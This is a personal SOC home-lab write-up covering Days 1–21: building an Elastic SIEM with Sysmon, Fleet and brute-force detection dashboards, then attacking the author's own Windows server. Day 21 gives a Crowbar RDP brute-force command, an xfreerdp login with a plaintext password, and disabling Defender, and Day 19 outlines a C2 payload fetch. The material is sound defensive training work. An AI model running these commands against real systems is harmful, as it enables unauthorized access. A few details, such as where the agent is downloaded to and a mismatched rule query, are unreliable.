# **30-Days SOC Challenge**

### **Day 1: Building a Network Architecture Diagram**

To kick off the challenge, I used **Draw.io** to design a logical network diagram for our SOC environment. This setup consists of six key servers:

- **Elastic & Kibana**: For centralized logging and visualization.
- **Windows Server**: With RDP enabled for remote desktop access.
- **Ubuntu Server**: With SSH enabled for secure management.
- **Fleet Server**: To manage agents across the network.
- **OS Ticket Server**: For ticketing and incident management.
- **C2 Server**: Running Mythic for command and control operations.

Our cloud infrastructure will be hosted on **VULTR**, with all servers residing within a **Virtual Private Cloud (VPC)** to maintain a secure, private network. 

I also added an **Internet Gateway** symbol to represent our connection to the broader internet via our Internet Service Provider (ISP).

The attacker's machine will run **Kali Linux**, serving as the platform for testing attacks on our SOC environment. The **C2 Server** will use **Mythic** to simulate adversarial command and control.

![Logical Diagram](https://github.com/user-attachments/assets/51a620c1-a44b-46d9-8705-c76211eb8fa4)

### **Day 2: Introduction to the Elastic Stack**

The **Elastic Stack**—commonly referred to as the **ELK Stack**—consists of three core components that work together to ingest, process, store, and visualize data:

- **Logstash**: Handles data ingestion. Acting as a pipeline, Logstash pulls data from various sources, processes it using filter plugins, and sends it to the desired destination, typically Elasticsearch. It transforms raw logs into structured data for more effective analysis.
  
- **Elasticsearch**: The heart of the stack. Elasticsearch is a highly scalable search and analytics engine that stores and indexes the processed data. It enables powerful querying, searching, and real-time analysis, making it ideal for managing large datasets.

- **Kibana**: The visualization tool for the stack. Kibana offers an intuitive web interface where users can interact with the data stored in Elasticsearch. You can build detailed dashboards, perform real-time analysis, and generate insightful reports.

When properly integrated, these components provide a comprehensive platform for managing, analyzing, and visualizing log data—a critical asset for cybersecurity operations.

#### **Comparing ELK Stack to Splunk**
- **Elasticsearch** is equivalent to **Splunk's Indexer/Search Head**.
- **Logstash** functions similarly to the **Heavy Forwarder** in Splunk.
- **Kibana** serves as the **Web GUI**.
- **Beats/Agents** can be likened to Splunk’s **Universal Forwarder**.

### **Day 3: Elasticsearch Setup**

Today, I set up Elasticsearch on a cloud instance to continue building my SOC lab.

1. **Vultr Configuration**  
   I started by creating a new account on **Vultr**. Under the *Products* section, I navigated to *Network* and selected **VPC 2.0**. For the IP range, I configured it to match the one from my logical diagram.  
   ![VPC Configuration](https://github.com/user-attachments/assets/7775f919-f691-4c03-a46b-37790deb9020)

2. **Deploying Elasticsearch Server**  
   I deployed a new server for **Elasticsearch**, choosing **Ubuntu 22.04** as the base image and allocating **80GB** of storage. After setting it up, I used my **Kali VM** to SSH into the server.  
   ![SSH Into Elasticsearch Server](https://github.com/user-attachments/assets/f5649bbd-778f-4586-87ec-0f56363854d8)

3. **Installing Elasticsearch**  
   In the terminal, I searched for the **Elasticsearch** package for the **debx86** platform and used the `wget` command to download it.  
   ![Wget Command for Elasticsearch](https://github.com/user-attachments/assets/0fc9299a-ffda-4376-9f58-c920891f5d51)

   To install it, I ran the command:  
   ```bash
   dpkg -i elasticsearch-8.15.0-amd64.deb
   ```

4. **Network Configuration**  
   I opened a **nano** file and stored the **Elasticsearch** password for future use. To configure the network, I typed `ip a` to get the server’s IP address and then modified the **elasticsearch.yml** file. I set the `network.host` to the server's IP and uncommented the `http.port` line to ensure proper configuration.  
   ![Network Configuration](https://github.com/user-attachments/assets/a04e1c99-fc54-4eb6-8f58-06c559c79592)

5. **Firewall Setup**  
   I added a **firewall rule** in Vultr to only allow my IP address to SSH into the Elasticsearch server, ensuring security for remote access.

6. **Issue and Resolution**  
While configuring **Elasticsearch**, I encountered the following error when trying to start the service:

```bash
java.net.UnknownHostException: 45.76.64.199/23: Name or service not known
```

This error occurred because **Elasticsearch** was trying to bind to the IP address `45.76.64.199/23`, which includes `/23` — a **CIDR (Classless Inter-Domain Routing)** notation that represents a subnet. 

**Elasticsearch** doesn't expect CIDR notation in the `network.host` setting because it's looking for a single IP address, not a range of addresses. The `/23` essentially tells Elasticsearch to interpret the IP as part of a larger network, which isn't appropriate for this setting.

To fix the issue, I removed the `/23` from the IP address, leaving just the single IP (`45.76.64.199`). This allowed Elasticsearch to bind to the correct network interface and start successfully.

**DAY 4: KIBANA SETUP**

1. **Downloading Kibana:**
   I visited the official Elastic website and copied the download link for the **Kibana** `Debx86_64` package, and pasted the link to the terminal to download it.
   ![image](https://github.com/user-attachments/assets/273becb8-b553-4faa-99f2-99bd9876ba15)

2. **Configuring Kibana:**
   After downloading, I opened the `kibana.yml` configuration file and made the following changes:
   - **Server Port**: Confirmed the default Kibana port (`5601`).
   - **Server Host**: Set this to the public IP address of the VULTR virtual machine to allow external access.

3. **Starting Kibana Service:**
   I started the Kibana service and verified its status to ensure it was running correctly.
   ![image](https://github.com/user-attachments/assets/a3ed1893-d928-46ac-8bad-96ae1b2a8add)

4. **Creating Enrollment Token:**
   To connect Kibana to **Elasticsearch**, I needed to create an enrollment token. I navigated to the **Elasticsearch bin directory** with:
   ```bash
   cd /usr/share/elasticsearch/bin
   ```
   Then, I generated the token using the following command:
   ```bash
   ./elasticsearch-create-enrollment-token --scope kibana
   ```

5. **Accessing Kibana in the Browser:**
   I tried to access the Kibana web interface by typing `http://<VM-Public-IP>:5601` in my browser. However, I couldn't connect because the firewall was configured to allow **SSH connections only**, and I was trying to access port 5601.

6. **Updating Firewall Rules:**
   To resolve the issue, I updated the firewall rules on **VULTR** to allow any **TCP connections (ports 1-65535)** from my SOC analyst workstation to the VM.  
   
   Additionally, I needed to allow port 5601 on the Ubuntu server itself. I ran the following command on my terminal:
   ```bash
   ufw allow 5601
   ```

7. **Logging in to Kibana:**
   After updating the firewall rules, I could access the Kibana web interface. I pasted the previously generated **enrollment token**, and Kibana prompted me for a verification code. To obtain it, I ran the following command:
   ```bash
   cd /usr/share/kibana/bin
   ./kibana-verification-code
   ```
   ![image](https://github.com/user-attachments/assets/8410f44c-248a-4572-9031-e45725172b1f)

8. **Logging In:**
   Kibana then asked for my username and password. I retrieved these credentials from the file where I had saved the **Elasticsearch security configuration** details. Once logged in, I navigated to **Security → Alerts**.
   ![image](https://github.com/user-attachments/assets/04585c90-5d4a-4409-a5d3-cee4cdb3940f)

9. **Generating Encryption Keys:**
   To enhance security, I generated encryption keys for Kibana using the following command: Here’s how you can include the command:
    ```bash
    ./kibana-encryption-keys generate
    ```

    This ensured that Kibana had the necessary encryption keys for secure communication.
    ![image](https://github.com/user-attachments/assets/e173e987-d683-4d98-8801-cfc4afa30b60)

10. **Restarting Kibana:**
    After adding the encryption keys to the configuration, I restarted the Kibana service. 
    ![image](https://github.com/user-attachments/assets/68d1f2dd-77ef-420b-972b-86068b2b2fdc)
    The **Security Alerts** section no longer displayed any warning messages. 
    ![image](https://github.com/user-attachments/assets/d55fbfcc-62b3-451b-ac5e-777679d883e1)


**DAY 5: WINDOWS SERVER 2022 INSTALLATION**

I began by deploying a new server, selecting "Cloud Compute - Shared CPU" for the deployment options. I chose the same city as my Elastic server and selected the "Windows Standard 2022" image.

To enhance security, I updated my logical diagram to ensure that the Windows server and the Ubuntu server are outside of the Virtual Private Cloud (VPC). This segregation was implemented to prevent attackers from accessing critical servers like the Fleet Server, Elastic & Kibana, or the OS Ticket system in case these servers were compromised.

![Updated Diagram](https://github.com/user-attachments/assets/088aec71-37be-49ea-a4b2-32a131ebb6bb)

I disabled IPv6 and opted out of Virtual Private Cloud 2.0 to ensure that the Windows server was not included in the VPC. By leaving the firewall group blank, I allowed unrestricted access to the server for this deployment.

![Windows Server Deployment](https://github.com/user-attachments/assets/c4bcb25d-b441-456a-97d5-374bb34f42a9)

**DAY 6: ELASTIC AGENT AND FLEET SERVER INTRODUCTION**

**Elastic Agent**: The Elastic Agent is a unified, lightweight software tool that can be installed on servers, VMs, or containers to collect and send data to the Elastic Stack. It merges the functionalities of multiple agents, such as Filebeat, Metricbeat, and Packetbeat, into a single agent. This consolidation simplifies deployment and management. Elastic Agent is used to collect logs, metrics, and security data, and it also performs endpoint security tasks, such as malware detection and threat analysis.

**Fleet Server**: Fleet Server is a component responsible for managing and coordinating communication between Elastic Agents and the Elastic Stack. It serves as a central hub for enrolling, configuring, and monitoring Elastic Agents in real time. Fleet Server facilitates large-scale deployments of Elastic Agents, ensuring proper management and monitoring. It simplifies scaling, configuration management, and agent activity monitoring.


**DAY 7: ELASTIC AGENT AND FLEET SERVER SETUP**

1. **Deploying the Fleet Server**  
   I clicked on "Deploy New Server" and selected the same city as my previous setup. For the image, I chose Ubuntu 22.04, and connected it to the VPC network I created earlier using VPC 2.0.

2. **Fleet Server Setup**  
   In the Elastic Management Console, I navigated to **Fleet** under **Management**. I clicked on **Add Fleet Server** and selected **Quick Start**.  
   For the **Host URL**, I used the public IP of the Fleet Server.  

   ![Fleet Server Setup](https://github.com/user-attachments/assets/1d7c872e-7fd4-4927-b699-ca48a66601ed)

3. **SSH into the Fleet Server**  
   I SSHed into the Fleet Server and updated the system by running:  
   ```bash
   apt-get update && apt-get upgrade -y
   ```  
   After updating, I went back to the Elastic webpage, copied the installation command for the Elastic Agent, and pasted it into the Fleet Server terminal to begin the installation.

   ![Elastic Agent Installation](https://github.com/user-attachments/assets/e0a71fcb-4884-44e0-b269-430ba2cf7c2c)

4. **Configuring Firewall Rules**  
   To allow the Fleet Server to communicate with the ELK server, I modified the ELK server firewall by adding the Fleet Server's public IP address. I also allowed port **9200**, as it’s the default port for Elasticsearch.
   ![Firewall Configuration](https://github.com/user-attachments/assets/a8e3f679-b6a8-48a4-a308-2586f9c05fdf)

5. **Fleet Server Connected**  
   After successfully installing, I returned to the Elastic webpage and confirmed that the Fleet Server was connected. I clicked **Continue** to begin enrolling the Elastic Agent. I then created a policy named **SOC-Windows-Policy** and copied the Windows installation command for later use on the Windows Server.

   ![Fleet Server Connected](https://github.com/user-attachments/assets/b0cd1e6b-6193-4553-955d-57edba91494b)

6. **Elastic Agent Installation on Windows Server**  
   I opened PowerShell on the Windows server and pasted the installation command, but the installation failed due to a firewall rule. To fix this, I allowed port **8220** on the Fleet Server:  

   ```bash
   ufw allow 8220
   ```

7. **Troubleshooting and Resolution**  
   I encountered another error related to port **443**. After inspecting the Fleet Server, I realized that it was set to use **port 443** instead of **8220**, so I corrected the configuration.

   I reran the command  on Powershell, this time changing the port to **8220** and adding the `--insecure` flag, as I didn't have a certificate authority. The agent was installed successfully.
   ![Elastic Agent Installation Successful](https://github.com/user-attachments/assets/a371ac1e-d5e4-4389-a66d-56b31c99044b)

8. **Final Verification**  
   After installation, I returned to the Elastic console and confirmed that the Windows Server was successfully enrolled into the fleet.

   ![Windows Server Enrolled](https://github.com/user-attachments/assets/cfc518ac-0e8c-4958-b8dd-61c771d8a8d0)

9. **Viewing Logs in Discover**  
   I clicked on **Discover** in the Elastic console and confirmed that logs were being successfully collected from the Windows Server.

   ![Logs in Discover](https://github.com/user-attachments/assets/a9c00ba0-90f2-4982-89b9-ecf532476b4f)

**DAY 8: WHAT IS SYSMON?**

On Windows endpoints, logging is enabled by default, but the built-in log settings often lack the depth required for effective monitoring in security operations. **Sysmon** (System Monitor) is a free, powerful tool from Microsoft that enhances the default logging capabilities and provides detailed information about various system activities.

### What Sysmon Monitors:
- **Process Creation (Event ID 1)**: Logs whenever a process is created. This includes information such as process name, process ID (PID), and the user account that executed the process.
- **Network Connections (Event ID 3)**: Captures network connection details, including source IP, destination IP, source port, destination port, and the process involved in making the connection. This is extremely useful for network forensics and tracing back malicious connections to a specific process.
- **File Creations**: Logs whenever new files are created on the system, helping to detect unauthorized file modifications or malware installations.
- **Hashes of Executables**: Sysmon can generate cryptographic hashes of executables, which can be valuable for OSINT (Open-Source Intelligence) and comparing files against known malicious software.
  
### Process GUID and Event Correlation:
Each process logged by Sysmon is assigned a **Process GUID** (Globally Unique Identifier), which remains consistent across multiple events related to the same process. This allows analysts to easily correlate different logs, even if the process ID changes (which happens when a process terminates and a new one starts).

### Additional Sysmon Events:
- **Event ID 6**: Captures driver loading, useful for identifying potentially malicious drivers loaded onto the system.
- **Event ID 7**: Logs image loading, providing insight into libraries and DLLs being loaded by processes.
- **Event ID 8**: Detects the creation of remote thread injections, which could indicate malicious code injection techniques used by attackers.
- **Event ID 10**: Identifies process access, which logs when one process gains access to another (often a sign of malicious activity such as privilege escalation).
- **Event ID 22**: Logs DNS queries, which can reveal suspicious domain lookups and potential command-and-control (C2) activity, crucial for threat detection involving malware or phishing attempts.


### **Day 9: Sysmon Setup**

 I set up **Sysmon** (v15.5) on my Windows server to improve system monitoring capabilities. Below are the steps I followed:

1. **Accessing the Server**:  
   I used **RDP** to connect to the Windows Server.

2. **Downloading Sysmon**:  
   Opened **Microsoft Edge**, searched for "Sysmon," and downloaded the latest version (**v15.5**) from the official Sysinternals page.
   ![Download Sysmon](https://github.com/user-attachments/assets/41a01ca4-c4c3-4cf1-84ea-e662ce737243)

3. **Extracting Sysmon**:  
   After downloading, I located the zip file, right-clicked on it, and selected **Extract All** to unpack the files.
   ![Extract Sysmon](https://github.com/user-attachments/assets/ae05211b-fadb-4c71-abe6-a3eac62ea5a7)

4. **Downloading the Sysmon Configuration File**:  
   I navigated to the **Sysmon Olaf Configuration File** repository on GitHub, saved the file as raw, and placed it in the Sysmon folder.

5. **Installing Sysmon**:  
   I opened **PowerShell as an Administrator**, navigated to the folder where the Sysmon configuration file was saved, and ran the following commands to install Sysmon and apply the configuration:
   ```powershell
   .\Sysmon64.exe
   .\Sysmon64.exe -i sysmonconfig.xml
   ```

6. **Verifying Sysmon Installation**:  
   I checked **Services** to confirm Sysmon was active and opened **Event Viewer** to verify that Sysmon logs were being generated.
   ![Sysmon Logs in Event Viewer](https://github.com/user-attachments/assets/764a3358-f39d-4814-884b-2d79c2985f06)


### **Day 10: Ingesting Data With Elasticsearch**

1. **Custom Windows Event Logs Integration:**
   - Navigated to the Elasticsearch homepage and clicked on 'Add integrations.'
   - Selected 'Custom Windows Event Logs' and added the integration.
   - For the channel name, I used `Microsoft-Windows-Sysmon/Operational`, which I identified by opening the Window's Server Event Viewer, navigating to Sysmon, right-clicking on 'Operational,' and selecting 'Properties.'
     ![Sysmon Channel](https://github.com/user-attachments/assets/866c4715-629c-4d51-9a06-2ee9b9fd3782)
   - Assigned this integration to the previously created Agent policy: `SOC-Windows-policy 1`
   - Clicked 'Save and Continue,' then `Save and Deploy`.

2. **Defender Logs Integration:**
   - Created another integration for Windows Defender Logs.
   - Found the channel name by going to the Event Viewer, selecting `Windows Defender,`. right-clicking `Operational,` and clicking on `Properties`.
     ![Defender Logs Channel](https://github.com/user-attachments/assets/4ca2f9ba-bab9-4699-8779-338fd306af31)
   - To limit the number of informational logs, I chose the following event IDs: 116, 117, 5001. In the advanced settings, I entered these event IDs and added the integration to the 'SOC-Windows-policy 1.'
   - Saved and deployed the changes.
     ![Event IDs Configuration](https://github.com/user-attachments/assets/4dc88d3c-809f-488b-bdb4-d75740499bae)

3. **Troubleshooting and Verification:**
   - Initially, I could not see any Sysmon logs under the 'Discover' tab in Elasticsearch.
   - I Restarted the Elastic Agent service on the Windows Server.
   - Adjusted the firewall settings to allow traffic on port 9200.
   - After making these adjustments, I was able to see Sysmon logs in Elasticsearch.
     ![Sysmon Logs](https://github.com/user-attachments/assets/6a18caeb-5be2-4428-a183-f3b35b2ee641)

### **Day 11: Brute Force Attack**
A **Brute Force Attack** is a trial-and-error method used by attackers to guess login credentials or encryption keys by systematically trying every possible combination until the correct one is found. This attack is commonly used when weak passwords or limited security measures are in place, exploiting the vast number of potential guesses. Although time-consuming and resource-intensive, brute force attacks can be successful against systems with inadequate protection, making strong passwords and account lockout mechanisms essential defense measures.

### **Day 12: Ubuntu Server 24.04 Installation**
I clicked on `Deploy New Server` and chose a `cloud compute-shared CPU` since I didn’t need a powerful server. I selected the same city as the other servers and chose Ubuntu 24.04 as the image. I left the server settings as default.

Once the server was running, I used a Linux VM to SSH into it. I updated the server from the terminal and checked the `auth.log` file to see if there were any failed logins, but since I had just opened the server, nothing was there. I ran the command `grep -i failed auth.log`, and nothing showed up.  
![image](https://github.com/user-attachments/assets/5c19fa18-57a9-4fe7-bef3-227b6b1df262)

After waiting 45 minutes, I ran the command again, and this time, there were several failed logins.  
![image](https://github.com/user-attachments/assets/006c1b27-b4a4-42f3-a489-fdaeb8d7d409)

I wanted to filter the output to only display the IP addresses of users attempting to use the root command. Since the IP address was the 9th delimiter, I used the command `grep -i failed auth.log | grep -i root | cut -d ' ' -f 9`to extract it.  
![image](https://github.com/user-attachments/assets/790964cb-ca35-48f4-8b83-6248b6066229)
All the attempts seemed to come from the same IP address. 


### **Day 13: Installing Elastic Agent on Ubuntu**
I navigated to the Fleet section of Elastic, created a new agent policy named `Ubuntu-SSH-Policy`, and selected it.

Next, I went back to Fleet, clicked on `Add Agent`, selected the `Ubuntu-SSH-Policy`, and clicked on `Enroll in Fleet`. I chose `Linux Tar` for installation and copied the command.  
![image](https://github.com/user-attachments/assets/739eb0f9-789f-4d19-978b-89362de600e0)

After running the command on the Ubuntu terminal, I encountered the following error:  
`Error: fail to enroll: fail to execute request to fleet-server: x509: certificate signed by unknown authority`.  
To resolve this, I added `--insecure` to the command, since I didn’t have a self-signed certificate.

After rerunning the command, the agent successfully enrolled.  
![image](https://github.com/user-attachments/assets/76ba3fc7-bf17-4743-96d4-8359feee7b73)

I then went to the `Discover` section in Elastic, and the Ubuntu server appeared under the list of agents.

Returning to the Ubuntu terminal, I checked the `auth.log` file again and noticed a new IP address with failed login attempts. I copied the IP address with the most failed attempts and pasted it into Elastic.  
![image](https://github.com/user-attachments/assets/390e0546-bb63-4ed4-bc48-47e1d662ac0b)  
There were 177 events showing authentication failures from this IP address.

### **Day 14: Creating Alerts and Dashboards in Kibana**
In Elastic, I clicked on `Discover`, filtered the results to show only the Ubuntu server agent, and added `system.auth.ssh.event`, `user.name`, and `source.ip` as columns. I filtered the results to display only failed attempts and saved it as `SSH failed activity`.  
![image](https://github.com/user-attachments/assets/2887306e-e551-42f8-8a0f-1c433fa730b5)

I created a new rule from this search query and named it `SSH Brute Force Activity`. I configured the rule to alert me if there were 5 failed login attempts within 5 minutes. Though not perfect, it served as a basic test for the lab.  
![image](https://github.com/user-attachments/assets/92abdf6e-e4b9-44ed-8f9f-8eea9ab9937c)

Next, I went to the `Maps` section and typed the following into the search:  
`system.auth.ssh.event:*` and `agent.name:"Ubuntu-SSH-Server"` and `system.auth.ssh.event:"Failed"`

I clicked `Add Layer`, selected `Choropleth`, chose `Administrative Boundaries`, and then under EMS, selected `World Countries`. For the data view, I used the query we had just defined.  
![image](https://github.com/user-attachments/assets/5dae236f-99cd-4c68-a49b-109fbf6b8e0b)

I saved this visualization as `SSH Failed Authentications Network Map` and added it to a new dashboard.  
![image](https://github.com/user-attachments/assets/110171e9-e254-4564-9eb6-3b878186fbd2)

I duplicated the map, modified the query to show both `failed` and  `accepted` attempts.
![image](https://github.com/user-attachments/assets/669422bd-237b-4f5e-ad63-ea4610e96294)

### **Day 15: Remote Desktop Protocol (RDP)**

**Overview:**
Remote Desktop Protocol (RDP) is a widely used tool that allows users to remotely connect to and control systems over a network. While it provides convenience for administrators and users working offsite, RDP can be a major security risk if not properly secured. If attackers gain access through RDP, they can exploit it to steal credentials (known as credential dumping) and move laterally across the network, compromising other systems. This makes RDP a significant attack vector, especially when it's exposed to the internet without adequate protection.

**Identifying Open RDP Ports:**
Tools like **Shodan** and **Censys** allow you to search for open RDP ports (3389) and identify exposed systems. If you find an open RDP port in your organization, evaluate if it's necessary. If not, **disable RDP**. If needed, ensure it's behind a firewall and accessible only via a **VPN**.

**Protecting Against Unauthorized RDP Access:**
To secure RDP, follow these best practices:
1. **Turn off RDP** when not in use.
2. **Use Multi-Factor Authentication (MFA)** for an added layer of security.
3. **Restrict access** by limiting RDP to specific IP addresses.
4. **Strengthen passwords** and use **Privileged Access Management (PAM)** to monitor sessions.
5. **Disable or rename default accounts** like Administrator to prevent easy exploitation.

These steps will help secure your network from RDP-based attacks.


### **Day 16: Creating Alerts and Dashboards in Kibana**

Today, I focused on setting up alerts and dashboards in Kibana to monitor failed login attempts, particularly through Remote Desktop Protocol (RDP) and Secure Shell (SSH) brute force attempts.

To start, I navigated to Elastic's "Discover" section, selected `agent.name`, and filtered for my Windows Server. I knew that failed login attempts are logged under Event ID 4625, so I entered `event.code:4625` in the query to narrow the results. From there, I added filters for the source IP and username to get a clearer picture of what was happening.

Once I had everything in place, I saved the query as **RDP failed activity**. To test the setup, I attempted an RDP login from a virtual machine, expecting it to fail. Sure enough, Kibana captured the failed attempt!
 
<img width="1265" alt="image" src="https://github.com/user-attachments/assets/f5117f21-ec96-47d6-8760-bb4ce6158302">


With the failed login attempt visible, I proceeded to create an alert. By selecting **Alerts** and clicking on **Create search threshold rule**, I named the rule **RDP Brute Force Activity** and set it to trigger when there were more than 5 failed attempts. I then went to **Management** > **Stack Management** > **Alerts** to confirm the alert was being generated.

However, I quickly noticed the alert lacked crucial information—it didn’t show the affected user or the source IP. To address this, I decided to recreate the rule under the **Security** section for more detailed results.

Under **Security** > **Rules** > **Detection rules (SIEM)**, I created a new threshold rule. For my custom query, I used:

```bash
system.auth.ssh.event: "Failed" AND agent.name: "Ubuntu-SSH-Server" AND user.name: "root"
```

I grouped the results by `user.name` and `source.ip`, naming this rule **SSH Brute Force Attempt**. The rule was set to run every 5 minutes with a 5-minute look-back period, ensuring that any new attempts would be detected quickly.

![SSH Brute Force Rule](https://github.com/user-attachments/assets/01bde113-1db2-4b89-8409-82c09a3fe066)

I replicated this process for my Windows server, using a similar query:

```bash
system.auth.ssh.event: "Failed" AND agent.name: "Windows-Server" AND user.name: "Administrator"
```

With both rules in place, I ensured continuous monitoring of potential brute force activities across both SSH and RDP connections.

### **Day 17: Creating Alerts and Dashboards in Kibana for RDP**

To monitor RDP events, I first navigated to **Maps** in Kibana and entered the following query:

```bash
event.code: 4625 and agent.name: Windows-Server
```

This query filters for failed RDP authentication attempts (`4625`), specifically targeting the `Windows-Server` machine.

I added a new layer, selected **Choropleth**, and chose **World Countries** for the EMS Boundaries.

![image](https://github.com/user-attachments/assets/c6562806-02ed-468b-8387-df35698fef68)

Upon visualizing the data, I discovered over **46,000 failed RDP authentication attempts** originating from Australia. I named the map **"RDP Failed Authentication"** and saved it to the dashboard I had created earlier.

Next, I focused on successful RDP authentications by creating a new map. I used this query to track **RDP Logon Types 10 and 7** (indicating successful remote logins):

```bash
event.code: 4624 and (winlog.event_data.LogonType: 7 or winlog.event_data.LogonType: 10) and agent.name: Windows-Server
```

![image](https://github.com/user-attachments/assets/0c563f01-8047-40a8-a83f-7b496aee8c93)

I then went to **Discover** and created a field displaying the timestamp, country name, source IP, and username:

![image](https://github.com/user-attachments/assets/e3168441-a29d-4969-972d-e1fd45f4d26f)

After that, I clicked on **Create Visualization** and pasted the **Failed SSH query**:

```bash
event.code: 4625 and agent.name: Windows-Server
```

I added the following fields to be displayed: `username`, `country name`, and `source IP`. I sorted the count of records in descending order, saved it, and named it `SSH Failed Authentications [Table]`. I duplicated this and created a similar table for successful SSH authentications.

![image](https://github.com/user-attachments/assets/2e9868ff-3fa7-446d-930b-8f819e0f65af)

Finally, I replicated the same process for **RDP Authentications**:

![image](https://github.com/user-attachments/assets/d05fb258-dace-40b1-83bd-31d2623d0336)


### **Day 18: Command and Control (C2)**

In the **MITRE ATT&CK** framework, a **Command and Control (C2)** refers to the mechanism that adversaries use to communicate with compromised systems in order to control them. Essentially, it’s how attackers maintain control over victim machines once they’ve gained access. The C2 infrastructure allows them to issue commands and receive data from compromised devices, helping attackers achieve their goals and objectives.

A **C2** setup typically has two key components:

1. **The Command Center**: This is usually a server or a network location controlled by the attacker. It acts as the hub for sending instructions to compromised systems and receiving feedback or exfiltrated data. In more sophisticated attacks, the command center may be hidden behind multiple layers of obfuscation, making it difficult for defenders to trace.

2. **Compromised Systems**: These are the devices infected with malware, granting the attacker persistent access. Once compromised, these systems establish a connection to the command center, allowing the attacker to issue commands, download or upload files, and execute various malicious tasks remotely.

In practical terms, a C2 server gives an attacker full control over a victim’s machine, enabling actions like data exfiltration, keylogging, and remote execution of commands. This kind of infrastructure is crucial for many stages of a cyberattack, including maintaining persistence, lateral movement, and data collection.

In summary, a C2 is the lifeline between the attacker and the compromised systems, allowing them to perform malicious activities while remaining in control of their operation.

### **Day 19: Creating an Attack Diagram**

**Phase 1: Initial Access**  
In this phase, we will perform a brute force attack against the **Windows Server** until we achieve a successful authentication.  
![Initial Access](https://github.com/user-attachments/assets/d0bee4a2-2707-4fad-a066-8fca9445a5f7)

**Phase 2: Discovery**  
Next, we will execute discovery commands such as `whoami`, `ipconfig`, `net user`, and `net group` to gather information about the system and its users.  
![Discovery](https://github.com/user-attachments/assets/388ca39b-099e-415d-956e-59fecdc7da8e)

**Phase 3: Defense Evasion**  
Once we have established an **RDP** session, we will disable **Windows Defender** on the **Windows Server** to avoid detection during our subsequent actions.  
![Defense Evasion](https://github.com/user-attachments/assets/9bd6cc27-0dfc-45c9-ae8f-fcea56dd3b4d)

**Phase 4: Execution**  
In this phase, we will use **PowerShell's** `Invoke-Expression` command to download the **Mythic Agent** onto our **C2 Server**. After the download is complete, we will execute the agent.  
![Execution](https://github.com/user-attachments/assets/ee01f372-9af1-4ec3-a18a-0b1b699c17f3)

**Phase 5: Command & Control (C2)**  
At this stage, we will establish a communication link between the compromised **Windows Server** and our **C2 Server**, allowing us to send commands and receive data.  
![Command & Control](https://github.com/user-attachments/assets/62f8d804-e550-4d30-994c-e5d6d979c8dd)

**Phase 6: Exfiltration**  
Finally, we will utilize the **C2 Server** to download the passwords file from the **Windows Server**, completing the attack sequence.  
![Exfiltration](https://github.com/user-attachments/assets/5efbfc42-90ba-4820-9c6b-5b629a4f6791)

### **Day 20: Mythic Server Setup**

On **VULTR**, I initiated the process by deploying a new server, selecting **"Cloud Compute - Shared CPU"** as the option. For the operating system, I chose **Ubuntu 22.04**, which is recommended for running **Mythic**. It’s advisable to use a machine with at least `2 CPUs` and `4GB` of RAM for optimal performance. I named the server **"Mythic C2"**.

After deploying, I logged into my **Kali VM** and established an SSH connection to the **Mythic server**. The first step was to update and upgrade the package repositories. Then, I installed **Docker** using the command:

```bash
apt install docker-compose
```

I confirmed that **Make** was already installed on the machine. Next, I cloned the **Mythic** Git repository with the following command:

```bash
git clone https://github.com/its-a-feature/Mythic
```

Once cloned, I navigated into the **Mythic** directory and executed:

```bash
./install_docker_ubuntu.sh
```
![Mythic Installation](https://github.com/user-attachments/assets/2e7a4c05-3620-4ee5-b2f8-a41e5eec5dfa)

Following this, I ran the command `make`. However, I encountered an error. To troubleshoot, I checked if **Docker** was running with:

```bash
systemctl status docker
```

I found that **Docker** was not active, so I restarted it with:

```bash
systemctl restart docker
```

After confirming that **Docker** was now active, I typed `make` again and then started the **Mythic CLI** with:

```bash
./mythic-cli start
```

Next, I returned to **VULTR** to create a firewall rule that would only allow my computer to connect to the **Mythic server**. I also added the **Windows Server** and **Ubuntu Server** to the allowed connections list for the **Mythic Server**.

To log into **Mythic**, I copied the server's public IP and appended port `7443` with `https`:

```
https://149.28.88.178:7443
```

By default, the username is `mythic_admin`. To find the password, I opened the Linux terminal and used the command:

```bash
ls -la
```

This command helped me locate the hidden files, specifically the `.env` file, which contains all the **Mythic** configuration details. To extract the admin password, I ran:

```bash
cat .env | grep ADMIN
```
![Admin Password Extraction](https://github.com/user-attachments/assets/c583a4b3-6a57-4766-b256-e3db76049455)

### **Day 21: Mythic Agent Setup**

I began by creating a text file named `passwords` in the **Documents** folder on my **Windows** machine. In this file, I entered the new password for my **Windows Server**: 
`Winter2024!`

Next, I opened my **Kali Linux** VM and navigated to the directory `/usr/share/wordlists`. I unzipped the `rockyou` password list with the following command:

```bash
sudo gunzip rockyou.txt.gz
```

After unzipping, I viewed the contents of the `rockyou.txt` file by running:

```bash
cat rockyou.txt
```

Since the password list was quite large, I decided to extract the first 50 entries and save them to a new file called `user-wordlist.txt`:

```bash
head -50 rockyou.txt > /home/user/user-wordlist.txt
```

I then navigated to the home directory and confirmed the contents of `user-wordlist.txt`:

```bash
cat /home/user/user-wordlist.txt
```
![Wordlist Preview](https://github.com/user-attachments/assets/49ca6e98-cf05-4289-b701-f563f9fd9042)

At the bottom of the file, I added my **Windows Server** password, `Winter2024!`.

Next, I installed **Crowbar** using the command:

```bash
sudo apt-get install -y crowbar
```

I encountered an error during the installation, so I updated my package repositories:

```bash
sudo apt-get update && sudo apt-get upgrade -y
```

After the update, I ran the command to install **Crowbar** again, and this time it was successful.

I created a new file named `target.txt` using **nano**, where I included my **Windows Server** IP address and the username. To perform the brute-force attack, I executed the following command:

```bash
crowbar -b rdp -u Administrator -C /home/user/user-wordlist.txt -s 45.63.57.62/32
```

In this command:
- `crowbar` specifies the use of the **Crowbar** service.
- `-b rdp` indicates the protocol being targeted (Remote Desktop Protocol).
- `-u Administrator` specifies the user account.
- `-C /home/user/user-wordlist.txt` points to the wordlist containing the passwords I want to try for authentication.
- `-s 45.63.57.62/32` indicates the target IP address using `/32` notation to target only that specific address.

Within just 7 seconds, I successfully gained access to the target machine!
![Access Gained](https://github.com/user-attachments/assets/d54d7edc-604c-4aab-847a-a5e4c84af676)

To connect to the **Windows Server** via **Remote Desktop**, I used the **xfreerdp** service with the following command:

```bash
xfreerdp /u:Administrator /p:Winter2024! /v:45.63.57.62:3389
```

This command allowed me to RDP into the **Windows Server** using my **Kali Linux VM**:
![RDP Access](https://github.com/user-attachments/assets/fe66748f-bbb3-4114-8e2d-9b20e2358caf)

Once logged in, I opened the **Command Prompt** and executed:

```bash
net user Administrator
```

This command allowed me to see which groups the Administrator account was a member of. I also went into the **Settings** and disabled **Windows Defender**. Finally, I established an SSH connection into the **Mythic Server**.

